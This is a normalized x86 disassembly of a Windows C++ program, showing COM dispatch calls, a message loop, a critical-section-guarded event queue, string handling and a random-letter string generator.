mov eax [ ebx + 0x18 ]
test eax eax
mov esi [ esp + 0x2c ]
je r-xdata
mov eax [ esi ]
lea edi [ esp + 0xc ]
mov ecx edi
push ecx
mov ecx [ esp + 0x3c ]
push ecx
push edx
push r--data
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jl r-xdata
mov edi eax
jmp r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
mov ecx [ ebx + 0x14 ]
push edx
mov edx [ ebx + 0x10 ]
push eax
push edi
push ecx
push edx
mov ecx esi
call sub_40da30
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
call sub_42e72f
add esp 0x1c
retn 0x24
sub_40da30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430428
push eax
mov [ fs : 0x0 ] esp
xor edx edx
sub esp 0x4c
cmp ecx edx
je r-xdata
mov [ esp ] edx
add ecx 0xffffffa4
mov [ esp ] ecx
jmp r-xdata
neg ax
push ebx
lea ecx [ esp + 0x34 ]
push ebp
push esi
sbb eax eax
and eax ecx
mov ecx [ esp + 0x78 ]
mov ebx [ ecx + 0xc ]
mov esi eax
xor eax eax
cmp ebx edx
jbe r-xdata
mov eax 0x80004005
pop edi
mov ecx [ esp + 0x4c ]
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x14
push edi
mov edi [ esp + 0x68 ]
mov ax [ edi + 0x6 ]
cmp ax 0x8
jle r-xdata
cmp eax [ ecx + 0x8 ]
jae r-xdata
lea esp [ esp ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x6c ]
lea edx [ esp + 0x34 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x70 ]
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x38 ] sub_42e115
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] edx
call [ VariantInit@IAT ]
mov [ esp + 0x64 ] 0x0
mov eax [ esp + 0x7c ]
test eax eax
jne r-xdata
mov edx eax
shl edx 0x4
mov ebx [ ecx ]
mov ebp [ ecx + 0x4 ]
mov ebp [ ebp + eax * 4 ]
add ebx edx
mov [ esi + ebp * 4 ] ebx
mov ebx [ ecx + 0xc ]
inc eax
add edx 0x10
cmp eax ebx
jb r-xdata
movsx edx [ edi + 0x6 ]
push eax
push esi
xor eax eax
mov ax [ edi + 0x4 ]
lea ecx [ edi + 0x8 ]
push ecx
mov ecx [ edi ]
push edx
lea edx [ esp + 0x34 ]
push eax
push ecx
push 0x0
push edx
call [ DispCallFunc@IAT ]
mov esi eax
mov [ esp + 0x64 ] 0xffffffff
lea eax [ esp + 0x14 ]
push eax
call [ VariantClear@IAT ]
mov ecx [ esp + 0x5c ]
mov eax esi
pop esi
pop ebp
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x14
lea eax [ esp + 0x14 ]
movsx ebp [ edi + 0x6 ]
mov ebx [ ecx ]
add ebx edx
sub ebp eax
mov [ esi + ebp * 4 - 0x4 ] ebx
mov ebx [ ecx + 0x8 ]
inc eax
add edx 0x10
cmp eax ebx
jb r-xdata
sub_40db80
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_43044e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov ecx sub_40a710
mov [ rw-data ] ecx
mov ecx sub_40d7d0
mov [ rw-data ] ecx
mov ecx sub_40c710
mov [ rw-data ] ecx
mov edx 0x5c
xor ecx ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x3e9
mov [ rw-data ] r--data
mov [ rw-data ] edx
mov [ rw-data ] 0x10f
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x3e9
mov [ rw-data ] r--data
mov [ rw-data ] edx
mov [ rw-data ] 0xfc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov [ esp + 0x8 ] 0xffffffff
sub_40dc90
push 0xffffffff
push sub_430473
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_418410
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x14 ]
mov [ esi ] r--data
call sub_40d6f0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40dcf0
push 0xffffffff
push sub_430493
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_40cff0
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_418460
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40dd70
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_40dda0
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_40ddd0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax 0x118
ja r-xdata
cmp eax 0x200
je r-xdata
xor eax eax
retn
mov eax 0x1
retn
cmp eax 0xf
je r-xdata
cmp eax 0xa0
jmp r-xdata
je r-xdata
sub_40de30
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ IsWindow@IAT ]
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x18 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
mov [ edi + 0x124 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x3e8
call ebx
mov ecx esi
inc esi
cmp ecx 0x5
jl r-xdata
mov eax [ edi + 0x18 ]
push eax
call ebp
test eax eax
jne r-xdata
mov [ edi + 0x124 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn
sub_40de90
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_40dec0
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_40def0
push ebx
push ebp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
push 0x0
push 0x0
push 0x0
push esi
call [ GetMessageW@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ PeekMessageW@IAT ]
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
push ebx
mov ecx edi
call [ eax + 0x4 ]
inc ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x24 ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ edi ]
push esi
mov ecx edi
call [ edx ]
test eax eax
jne r-xdata
xor ebp ebp
mov eax [ edi + 0x20 ]
cmp eax 0x118
ja r-xdata
push esi
call [ TranslateMessage@IAT ]
push esi
call [ DispatchMessageW@IAT ]
cmp eax 0x200
je r-xdata
jmp r-xdata
cmp eax 0xf
je r-xdata
mov ebp 0x1
xor ebx ebx
cmp eax 0xa0
jmp r-xdata
je r-xdata
sub_40df80
push 0xffffffff
push sub_4304b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ esp ] eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ esp + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40dfd0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x8 ]
dec esi
js r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
mov ebx [ esp + 0x10 ]
nop
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
dec esi
jns r-xdata
mov edx [ ecx ]
push ebx
call [ edx ]
test eax eax
jne r-xdata
test esi esi
jl r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
sub_40e030
push esi
push edi
mov edi ecx
mov eax [ edi + 0x14 ]
xor esi esi
test eax eax
jle r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
lea ecx [ ecx ]
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x14 ]
jge r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x14 ]
inc esi
cmp esi eax
jl r-xdata
mov edx [ ecx ]
call [ edx ]
test esi esi
jl r-xdata
sub_40e080
push 0xffffffff
push sub_4304d6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
xor edi edi
mov [ esp + 0x18 ] edi
mov eax [ esi + 0x10 ]
cmp eax edi
mov ebx [ free@IAT ]
je r-xdata
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi + 0x10 ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call ebx
add esp 0x4
mov [ esi + 0x4 ] edi
sub_40e100
push 0xffffffff
push sub_4304f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push esi
push edi
xor edi edi
push edi
mov esi ecx
call [ CoInitialize@IAT ]
lea ecx [ esi + 0x14 ]
call sub_40bc30
mov ecx esi
call sub_418320
mov [ esp + 0x8 ] r--data
mov [ esp + 0xc ] edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x48 ] 0x2
lea ecx [ esp + 0x8 ]
call sub_40def0
mov ecx esi
call sub_418350
call [ CoUninitialize@IAT ]
mov [ esp + 0x48 ] 0xffffffff
lea ecx [ esp + 0x8 ]
call sub_40e080
mov ecx [ esp + 0x40 ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x44
retn
sub_40e440
mov ecx [ esp + 0x4 ]
lea eax [ ecx - 0x4 ]
xor edx edx
test eax eax
je r-xdata
xor eax eax
lea eax [ ecx + 0x4 ]
jmp r-xdata
push esi
mov esi [ esp + 0xc ]
mov [ esi ] eax
mov eax [ esp + 0x10 ]
mov [ eax ] edx
mov eax [ esp + 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ecx + 0x10 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov edx [ esp + 0x14 ]
mov [ eax + 0x8 ] esi
lea eax [ ecx + 0x14 ]
mov ecx eax
mov esi [ ecx ]
mov [ edx ] esi
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ edx + 0x8 ] esi
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax ]
mov edx [ esp + 0x18 ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0xc ]
mov [ edx + 0xc ] eax
xor eax eax
pop esi
retn 0x18
sub_40e630
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ eax + 0x10 ]
push ecx
push edx
push eax
call [ InvalidateRect@IAT ]
xor eax eax
retn 0xc
mov edx [ esp + 0xc ]
mov eax [ ecx ]
push edx
mov edx [ esp + 0xc ]
push edx
call [ eax + 0x4 ]
xor eax eax
retn 0xc
sub_40e670
push 0xffffffff
push sub_430519
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40e6b0
push 0xffffffff
push sub_430539
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40e710
push 0xffffffff
push sub_430573
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov eax [ rw-data ]
push ebp
push esi
push edi
mov edi ecx
xor esi esi
mov [ esp + 0x2c ] eax
mov [ esp + 0xc ] esi
mov eax [ edi ]
lea ecx [ eax + eax + 0x2 ]
push ecx
call j_sub_42e3bc
add esp 0x4
lea ecx [ esp + 0x10 ]
mov ebp eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x38 ] 0x1
push esi
call [ time@IAT ]
push eax
call [ srand@IAT ]
mov eax [ edi ]
add esp 0x8
cmp eax esi
jbe r-xdata
mov edx [ edi ]
push ebp
lea ecx [ esp + 0x14 ]
mov [ ebp + edx * 2 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
push ebp
call ??_V@YAXPAX@Z
mov esi [ esp + 0x44 ]
add esp 0x4
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x30 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24 ]
pop ebp
call sub_42e72f
add esp 0x30
retn 0x4
push ebx
mov ebx [ rand@IAT ]
lea ecx [ ecx ]
call ebx
cdq
mov ecx 0x1a
idiv ecx
add edx 0x41
mov [ ebp + esi * 2 ] dx
mov eax [ edi ]
inc esi
cmp esi eax
jb r-xdata
pop ebx
sub_40e800
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430592
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0xa
call sub_40e710
mov [ esp + 0x2c ] 0x0
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x2c ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
lea ecx [ esp + 0x8 ]
push esi
push ecx
call sub_418800
mov ecx eax
call sub_418920
mov [ esp + 0x2c ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_40e8b0
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_4305b9
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
mov ecx rw-data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x8 ] 0x0
push sub_433f20
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_40e9b0
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov edx [ esp + 0xc ]
push esi
mov esi [ edx ]
lea ecx [ eax + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edx + 0x8 ]
mov [ ecx + 0x8 ] esi
mov edx [ edx + 0xc ]
mov [ ecx + 0xc ] edx
pop esi
retn 0xc
sub_40eac0
push 0xffffffff
push sub_4305d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0xc ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x14 ] 0x0
mov ecx [ esi + 0x8 ]
test ecx ecx
mov eax [ esp + 0x1c ]
mov [ esi + 0x28 ] eax
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push eax
call [ SetEvent@IAT ]
sub_40ec10
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov [ ecx ] ecx
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x4 ] ecx
cmp eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
je r-xdata
pop esi
retn
push edi
lea ecx [ ecx ]
mov edi [ eax ]
push eax
call ??3@YAXPAX@Z
mov ecx [ esi + 0x4 ]
add esp 0x4
cmp edi ecx
mov eax edi
jne r-xdata
pop edi
sub_40ec50
push ebp
mov ebp esp
push 0xffffffff
push sub_430601
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x18
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx esi
call sub_40e9b0
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40ecf0
mov eax [ fs : 0x0 ]
mov edx [ esp + 0x4 ]
push 0xffffffff
push sub_430619
push eax
mov [ fs : 0x0 ] esp
mov eax [ ecx + 0x8 ]
sub esp 0x44
push esi
mov esi 0xfffffff
sub esi eax
cmp esi edx
pop esi
jae r-xdata
add eax edx
mov [ ecx + 0x8 ] eax
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x4
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_40edc0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov ecx [ ebx + 0x4 ]
push eax
push ecx
push ebx
mov ecx edi
call sub_40ec50
push 0x1
mov ecx edi
mov esi eax
call sub_40ecf0
mov [ ebx + 0x4 ] esi
mov edx [ esi + 0x4 ]
pop edi
mov [ edx ] esi
pop esi
pop ebx
retn 0x8
sub_40ee00
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
cmp eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
je r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call ??3@YAXPAX@Z
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
sub_40ee40
push ebp
mov ebp esp
push 0xffffffff
push sub_430630
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x18
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] 0x1
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x28 ] ecx
test ecx ecx
je r-xdata
mov [ eax ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
sub_40ef40
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
cmp eax ecx
je r-xdata
pop esi
retn
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call ??3@YAXPAX@Z
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
sub_40ef70
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi ecx
mov edi [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
push edi
mov ecx esi
call sub_40ec50
push 0x1
mov ecx esi
mov ebx eax
call sub_40ecf0
mov [ edi + 0x4 ] ebx
mov edx [ ebx + 0x4 ]
pop edi
pop esi
mov [ edx ] ebx
pop ebx
retn 0x4
sub_40efb0
push 0xffffffff
push sub_430653
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_40ee40
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esp + 0x10 ] eax
lea eax [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] r--data
call [ InitializeCriticalSection@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f010
push 0xffffffff
push sub_430673
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea eax [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] r--data
call [ DeleteCriticalSection@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_40ec10
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
mov [ esi + 0x4 ] 0x0
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f080
push 0xffffffff
push sub_430688
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea ebp [ eax + 0x4 ]
push ebp
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x1c ] 0x0
mov edi [ esi + 0x4 ]
mov eax [ esp + 0x24 ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
push edi
mov ecx esi
call sub_40ec50
push 0x1
mov ecx esi
mov ebx eax
call sub_40ecf0
mov [ edi + 0x4 ] ebx
mov eax [ ebx + 0x4 ]
mov [ eax ] ebx
mov esi [ esi + 0x28 ]
test esi esi
je r-xdata
mov [ esp + 0x1c ] 0xffffffff
push ebp
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push esi
call [ SetEvent@IAT ]
sub_40f110
push 0xffffffff
push sub_4306a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x2c ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
add ecx 0x8
mov ebx [ ecx ]
mov ebp [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ esp + 0x20 ] ecx
mov ecx [ eax ]
cmp ecx eax
mov [ esp + 0x1c ] edx
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call ??3@YAXPAX@Z
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
mov esi [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov eax esi
mov [ eax ] ebx
mov [ eax + 0x4 ] ebp
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov [ esp + 0x2c ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x24 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn 0x4
mov esi [ esi + 0x28 ]
test esi esi
je r-xdata
push esi
call [ ResetEvent@IAT ]
sub_40f1e0
push 0xffffffff
push sub_4306c9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x1c ]
mov [ esi + 0x1c ] ecx
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
